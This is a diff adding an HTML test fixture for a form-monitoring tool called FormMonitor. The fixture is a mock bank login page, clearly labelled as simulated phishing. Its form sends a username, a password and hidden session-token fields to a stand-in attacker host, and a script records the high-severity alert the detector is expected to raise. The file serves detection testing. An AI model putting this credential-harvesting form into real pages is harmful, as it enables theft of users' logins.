@@ -1,0 +1,124 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Login - Example Bank</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      max-width: 400px;
+      margin: 50px auto;
+      padding: 20px;
+    }
+    .phishing-warning {
+      background: #ff0000;
+      color: white;
+      padding: 10px;
+      margin-bottom: 20px;
+      border-radius: 5px;
+      text-align: center;
+    }
+    .login-form {
+      border: 1px solid #ccc;
+      padding: 20px;
+      border-radius: 5px;
+    }
+    label {
+      display: block;
+      margin-bottom: 5px;
+      font-weight: bold;
+    }
+    input {
+      width: 100%;
+      padding: 8px;
+      margin-bottom: 15px;
+      border: 1px solid #ddd;
+      border-radius: 3px;
+      box-sizing: border-box;
+    }
+    button {
+      width: 100%;
+      padding: 10px;
+      background-color: #28a745;
+      color: white;
+      border: none;
+      border-radius: 3px;
+      cursor: pointer;
+      font-size: 16px;
+    }
+    button:hover {
+      background-color: #218838;
+    }
+  </style>
+</head>
+<body>
+  <div class="phishing-warning">
+    <strong>⚠️ TEST PHISHING PAGE ⚠️</strong><br>
+    This is a simulated phishing attack for testing FormMonitor
+  </div>
+
+  <div class="login-form">
+    <h1>ExampleBank Login</h1>
+    <p>Please enter your credentials</p>
+
+    <!-- MALICIOUS: Cross-origin credential exfiltration -->
+    <form id="phishing-form" action="https://attacker-controlled-domain.com/harvest-credentials" method="POST">
+      <label for="username">Username:</label>
+      <input type="text" id="username" name="username" value="victim@bank.com" required>
+
+      <label for="password">Password:</label>
+      <input type="password" id="password" name="password" value="secretbanking123" required>
+
+      <!-- Hidden tracking fields (common in phishing) -->
+      <input type="hidden" name="referrer" value="https://example-bank.com">
+      <input type="hidden" name="session_token" value="captured-session-abc123">
+      <input type="hidden" name="device_fingerprint" value="fingerprint-hash">
+
+      <button type="submit" id="submit-btn">Secure Login</button>
+    </form>
+  </div>
+
+  <div id="test-status" style="margin-top: 20px; padding: 10px; background: #ffe0e0; border: 2px solid #ff0000; border-radius: 3px;">
+    <strong>FormMonitor Status:</strong> <span id="status-text">Analyzing...</span>
+  </div>
+
+  <script>
+    // FormMonitor test data
+    const form = document.getElementById('phishing-form');
+    const documentOrigin = window.location.origin || 'data:';
+    const actionOrigin = new URL(form.action).origin;
+
+    const isCrossOrigin = documentOrigin !== actionOrigin;
+    const allFields = form.querySelectorAll('input');
+    const hiddenFields = form.querySelectorAll('input[type="hidden"]');
+    const passwordFields = form.querySelectorAll('input[type="password"]');
+
+    window.__formMonitorTestData = {
+      testName: 'phishing-attack',
+      documentUrl: window.location.href,
+      actionUrl: form.action,
+      formOrigin: documentOrigin,
+      actionOrigin: actionOrigin,
+      method: 'POST',
+      hasPasswordField: passwordFields.length > 0,
+      hasEmailField: false,
+      isCrossOrigin: isCrossOrigin,
+      totalFields: allFields.length,
+      hiddenFields: hiddenFields.length,
+      passwordFields: passwordFields.length,
+      expectedAlert: 'credential_exfiltration',
+      expectedSeverity: 'high',
+      expectedAnomalyIndicators: [
+        'Cross-origin credential submission',
+        'Hidden tracking fields detected'
+      ],
+      note: 'MALICIOUS: Cross-origin password submission should trigger high-severity alert'
+    };
+
+    document.getElementById('status-text').textContent =
+      `THREAT DETECTED: Cross-origin (${documentOrigin} → ${actionOrigin}), ` +
+      `Password field: YES, Hidden fields: ${hiddenFields.length}`;
+  </script>
+</body>
+</html>
